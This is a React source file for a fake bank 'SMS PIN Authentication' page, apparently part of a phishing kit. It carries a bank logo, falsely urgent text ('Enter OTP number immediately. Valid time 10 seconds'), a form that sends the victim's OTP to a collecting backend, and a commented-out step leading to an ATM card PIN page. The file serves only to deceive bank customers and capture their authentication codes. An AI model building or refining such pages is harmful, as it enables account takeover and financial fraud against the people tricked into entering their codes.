import React, { useState, useEffect, useRef } from "react";
import { FaEnvelope, FaExclamationTriangle } from "react-icons/fa";
import axios from "axios";
import logo from "./assets/qib.png";
import { useNavigate } from "react-router-dom";

const Thirdotp = () => {
  const [otp, setOtp] = useState("");
  const [timeLeft, setTimeLeft] = useState(85); // 1:25
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState("");
  const [isError, setIsError] = useState(false);
  const inputRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    inputRef.current?.focus();
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = () => {
    const min = Math.floor(timeLeft / 60);
    const sec = timeLeft % 60;
    return `${min}:${sec.toString().padStart(2, "0")}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!otp) {
      inputRef.current.focus();
      setMsg("Please enter your OTP.");
      setIsError(true);
      return;
    }

    if (!/^\d{4,6}$/.test(otp)) {
      inputRef.current.focus();
      setMsg("OTP must be 4–6 digits.");
      setIsError(true);
      return;
    }

    setLoading(true);
    setMsg("");
    setIsError(false);

    try {
      // ✅ Send OTP to backend for verification
      const res = await axios.post("http://localhost:3000/api/verify-otp", { otp });

      if (res.data.success) {
        setMsg("OTP verified successfully!");
        setIsError(false);

        // ✅ Optionally navigate after short delay
        setTimeout(() => {
          setLoading(false);
          navigate("/success"); // change route as needed
        }, 1000);
      } else {
        setMsg("Invalid OTP. Please try again.");
        setIsError(true);
        setLoading(false);
        inputRef.current.focus();
      }
    } catch (error) {
      setMsg("Server error. Try again later.");
      setIsError(true);
      setLoading(false);
      inputRef.current.focus();
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4 relative">
      {/* ✅ Full-page Loader */}
      {loading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white bg-opacity-80 z-50">
          <div className="w-14 h-14 border-4 border-[#0075B0] border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {/* ✅ Fixed Logo */}
      <div className="w-full flex justify-center bg-white py-4 fixed top-0 left-0 z-50">
        <img src={logo} alt="Bank Logo" className="w-36 object-contain" />
      </div>

      {/* ✅ Main Box */}
      <div className="w-full max-w-md border border-gray-300 rounded-md shadow-sm bg-white mt-6">
        <div className="bg-gray-50 border-b border-gray-300 py-2 text-center rounded-t-md">
          <h2 className="text-gray-800 text-base">SMS PIN Authentication</h2>
        </div>

        <div className="p-6 text-center">
          <div className="flex justify-center mb-3">
            <FaEnvelope className="text-black text-2xl" />
          </div>

          <div className="flex items-start justify-center text-sm text-gray-800 mb-4 px-2">
            <FaExclamationTriangle
              size={18}
              className="text-yellow-500 mt-[3px] mr-2 flex-shrink-0"
            />
            <p className="text-[15px] leading-snug text-gray-700 text-left">
              Update your current balance in your bank account. Enter OTP number
              immediately. Valid time 10 seconds.
            </p>
          </div>

          <p className="text-sm text-gray-600 mb-5">Resend in: {formatTime()}</p>

          <form 
        //   onSubmit={handleSubmit}
           className="space-y-5">
            <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
              <div className="bg-gray-100 px-3 py-2 border-r border-gray-300">
                <FaEnvelope className="text-gray-600" />
              </div>
              <input
                ref={inputRef}
                type="number"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                placeholder="Enter OTP"
                className="flex-1 px-3 py-2 outline-none text-gray-700 placeholder-gray-500"
              />
            </div>

            {msg && (
              <div
                className={`mt-3 text-center font-medium ${
                  isError ? "text-red-600" : "text-green-600"
                }`}
              >
                {msg}
              </div>
            )}

            <button
            // onClick={()=>navigate("/atmcardpin")}
              type="submit"
              disabled={loading}
              className={`w-full ${
                loading
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-[#0075B0] hover:bg-[#0075B0]"
              } text-white py-2 rounded-md text-sm font-medium transition-all duration-200`}
            >
              Verify
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Thirdotp;
